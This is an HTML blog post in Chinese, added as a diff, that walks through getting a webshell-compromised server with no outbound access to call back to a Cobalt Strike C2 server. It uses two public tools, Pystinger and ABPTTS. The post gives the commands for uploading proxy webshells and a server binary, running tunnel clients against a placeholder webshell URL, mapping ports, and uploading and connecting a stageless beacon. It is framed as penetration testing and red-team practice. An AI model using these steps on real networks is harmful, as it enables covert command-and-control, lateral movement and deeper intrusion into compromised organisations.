@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>针对不出网机器上线CS方式 - B1gd0g</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="https://spring.io/images/favicon-9d25009f65637a49ac8d91eb1cf7b75e.ico" type="image/x-icon" />
+    <meta name="description" content="在渗透测试中以及攻防演练中，经常会遇到有些目标只对外开放了http服务，由于路由设置或防火墙等原因，导致攻击者在拿下webshell后却不能通过反弹shell正常上线到攻击者的C2服务器上无法继续进一步对内网进行测试或者提权，在这种情况下，就需要通过一些姿势来达到上线到C2服务器的目的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="针对不出网机器上线CS方式">
+<meta property="og:url" content="https://b1gd0g.github.io/2022/10/18/%E9%92%88%E5%AF%B9%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BFCS%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="B1gd0g">
+<meta property="og:description" content="在渗透测试中以及攻防演练中，经常会遇到有些目标只对外开放了http服务，由于路由设置或防火墙等原因，导致攻击者在拿下webshell后却不能通过反弹shell正常上线到攻击者的C2服务器上无法继续进一步对内网进行测试或者提权，在这种情况下，就需要通过一些姿势来达到上线到C2服务器的目的。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723784.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723735.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723682.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723155.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724195.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724850.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724896.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724607.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724145.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724466.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724592.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724577.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724071.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181729340.png">
+<meta property="article:published_time" content="2022-10-18T04:00:06.000Z">
+<meta property="article:modified_time" content="2022-10-18T09:32:20.134Z">
+<meta property="article:author" content="B1gd0g">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723784.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1666085558048">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1666085558048">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210111542873.png)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="B1gd0g" class="mdui-btn mdui-btn-icon"><img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="B1gd0g">
+            <img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g" alt="B1gd0g">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>16</div>
+        <div><span>标签</span>12</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%AF%94.html" title="杀软对比">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                杀软对比
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E7%A4%BE%E5%B7%A5%E5%AF%86%E7%A0%81.html" title="社工密码">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                社工密码
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E5%AF%BC%E8%88%AA.html" title="我的导航">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                我的导航
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    一言
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/tools/">tools</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/安全小记/">安全小记</a>
+          <span class="category-list-count">11</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Html/" style="font-size: 10px;">Html</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 10px;">钓鱼</a>
+    </div>
+    
+  </div>
+
+    
+        
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2022 B1gd0g
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
+            <img src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181729340.png" alt="针对不出网机器上线CS方式" loading="lazy">
+            <h1>针对不出网机器上线CS方式</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2022年10月18日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/">安全小记</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约1.2k字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要4分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <p>在渗透测试中以及攻防演练中，经常会遇到有些目标只对外开放了http服务，由于路由设置或防火墙等原因，导致攻击者在拿下webshell后却不能通过反弹shell正常上线到攻击者的C2服务器上无法继续进一步对内网进行测试或者提权，在这种情况下，就需要通过一些姿势来达到上线到C2服务器的目的。</p>
+<a id="more"></a>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中以及攻防演练中，经常会遇到有些目标只对外开放了http服务，由于路由设置或防火墙等原因，导致攻击者在拿下webshell后却不能通过反弹shell正常上线到攻击者的C2服务器上无法继续进一步对内网进行测试或者提权，在这种情况下，就需要通过一些姿势来达到上线到C2服务器的目的。</p>
+<h2 id="出网情况"><a href="#出网情况" class="headerlink" title="出网情况"></a>出网情况</h2><p>机器有dns、icmp、tcp、http等可出网的通信协议，因此要测试出目标可以通过哪种协议对外通信，结合起来对目标综合测试。当确定目标多种通信方式都不可支持，只能思考是否能通过http端口来实现上线的目的。</p>
+<h2 id="利用Pystinger上线CS"><a href="#利用Pystinger上线CS" class="headerlink" title="利用Pystinger上线CS"></a>利用Pystinger上线CS</h2><p>毒刺(pystinger)是通过webshell实现<strong>内网SOCK4代理</strong>,<strong>端口映射</strong>的工具，可直接用于metasploit-framework,viper,cobalt strike上线，工具主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本。</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a></p>
+<h3 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h3><p>工具内主要有server服务端、client客户端与webshell文件三部分组成。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723784.png" alt="image-20221017152143038" data-caption="image-20221017152143038" loading="lazy"></p>
+<p>将jsp脚本文件和stinger_server.exe两个文件上传到目标机器中。然后访问proxy.jsp，访问出现UTF-8则表示脚本正常，如果报错可能是上传时传输出现问题，可重新上传。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723735.png" alt="image-20221017151858282" data-caption="image-20221017151858282" loading="lazy"></p>
+<p>然后在目标上运行工具服务端</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">start</span> stinger_server.exe <span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723682.png" alt="image-20221017152339999" data-caption="image-20221017152339999" loading="lazy"></p>
+<p>在C2服务器上运行工具客户端stinger_client，-w参数为目标url，-l参数为自身ip，一般为127.0.0.1，-p参数为目标webshell流量转发到C2的端口号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">stinger_client.exe -w http://webshell.com/proxy.jsp -l 127.0.0.1 -p 60000<br>./stinger_client -w http://webshell.com/proxy.jsp -l 127.0.0.1 -p 60000<br></code></pre></td></tr></table></figure>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181723155.png" alt="image-20221017153332957" data-caption="image-20221017153332957" loading="lazy"></p>
+<p>C2服务器新建HTTP监听，host为127.0.0.1，port为默认的60020。（如果要上线内网多台主机则将hosts设置为不出网的目标机器内网ip或者0.0.0.0即可）</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724195.png" alt="image-20221017153616454" data-caption="image-20221017153616454" loading="lazy"></p>
+<p>通过此类设置监听生成exe等，在目标机器上运行即可成功上线，查看client端可以看到服务端传递流量的一个情况，该机器提权也可以使用该监听回弹shell。（stinger_client端可查看传输过程流量）</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724850.png" alt="image-20221017153716672" data-caption="image-20221017153716672" loading="lazy"></p>
+<h2 id="通过ABPTTS正向连接上线cs"><a href="#通过ABPTTS正向连接上线cs" class="headerlink" title="通过ABPTTS正向连接上线cs"></a>通过ABPTTS正向连接上线cs</h2><h3 id="建立HTTP隧道"><a href="#建立HTTP隧道" class="headerlink" title="建立HTTP隧道"></a>建立HTTP隧道</h3><p>ABPTTS通过 HTTP/HTTPS 连接将 TCP 流量传输到 Web 应用程序服务器。换句话说，在任何可以部署 Web shell 的地方，现在都应该能够建立完整的 TCP 隧道。这允许通过 Web 应用程序服务器建立 RDP、交互式 SSH、Meterpreter 和其他连接。</p>
+<p>该通信被设计为完全符合 HTTP 标准，这意味着除了通过目标 Web 应用程序服务器建立隧道外<em>，</em>它还可用于通过数据包检查防火墙建立<em>出站连接。</em></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p>
+<p>依赖环境及模块：（以及可能遇到的环境报错问题）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">默认python2环境<br>pip install httplib2<br>pip install pycrypto<br></code></pre></td></tr></table></figure>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724896.png" alt="image-20221017163641939" data-caption="image-20221017163641939" loading="lazy"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python abpttsfactory.py -o server		<span class="hljs-comment">#生成服务端webshell</span><br></code></pre></td></tr></table></figure>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724607.png" alt="image-20221017163055355" data-caption="image-20221017163055355" loading="lazy"></p>
+<p>上传abptts.jsp文件到目标服务器，访问得到一串密文，说明脚本文件服务正常运行（此工具比较遗憾的是支持的web脚本类型只有aspx和jsp)</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724145.png" alt="image-20221017163214049" data-caption="image-20221017163214049" loading="lazy"></p>
+<p>客户端适用命令，将本机的5555端口通过http隧道映射至6666端口</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> abpttsclient.py -c server/config.txt -u <span class="hljs-string">&quot;http://webshell.com/ABPTTS.jsp&quot;</span> -f <span class="hljs-number">127.0.0.1:5555</span>/<span class="hljs-number">127.0.0.1:6666</span><br></code></pre></td></tr></table></figure>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724466.png" alt="image-20221017164016028" data-caption="image-20221017164016028" loading="lazy"></p>
+<h3 id="通过HTTP隧道正向连接"><a href="#通过HTTP隧道正向连接" class="headerlink" title="通过HTTP隧道正向连接"></a>通过HTTP隧道正向连接</h3><p>设置<strong>第一个监听</strong> ：CS中新建监听，监听端口上线端口均为6666</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724592.png" alt="image-20221017171858737" data-caption="image-20221017171858737" loading="lazy"></p>
+<p>把生成的exe在起客户端的机器上执行（就是让自己起客户端监听的机器上线，就是自己的虚拟机），返回虚拟机shell)</p>
+<p>设置<strong>第二个监听</strong>：</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724577.png" alt="image-20221017180616153" data-caption="image-20221017180616153" loading="lazy"></p>
+<p>通过该监听生成正向载荷（在生成正向载荷的时候只能选择stageless Beacon ）</p>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181724071.png" alt="image-20221017181411396" data-caption="image-20221017181411396" loading="lazy">
+
+<p>将生成的子beacon通过webshell上传至目标机器上执行，并确保exe已经在运行状态</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br><span class="hljs-attribute">tasklist</span><br></code></pre></td></tr></table></figure>
+<p>上述步骤/exe正常运行下，虚拟机beacon中执行以下命令即可成功上线目标机器。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">connect</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">5555</span>		<span class="hljs-comment">#在虚拟机shell上执行，目标成功上线（一次不行的话重启下服务端再试试）</span><br></code></pre></td></tr></table></figure>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210181729340.png" alt="image-20221018172943003" data-caption="image-20221018172943003" loading="lazy"></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%BD%91%E6%83%85%E5%86%B5"><span class="toc-number">2.</span> <span class="toc-text">出网情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Pystinger%E4%B8%8A%E7%BA%BFCS"><span class="toc-number">3.</span> <span class="toc-text">利用Pystinger上线CS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E4%BD%BF%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">具体使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ABPTTS%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E4%B8%8A%E7%BA%BFcs"><span class="toc-number">4.</span> <span class="toc-text">通过ABPTTS正向连接上线cs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8BHTTP%E9%9A%A7%E9%81%93"><span class="toc-number">4.1.</span> <span class="toc-text">建立HTTP隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87HTTP%E9%9A%A7%E9%81%93%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.2.</span> <span class="toc-text">通过HTTP隧道正向连接</span></a></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="搜索"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1666085558052"></script>
+
+
+
+</body>
+
+</html>
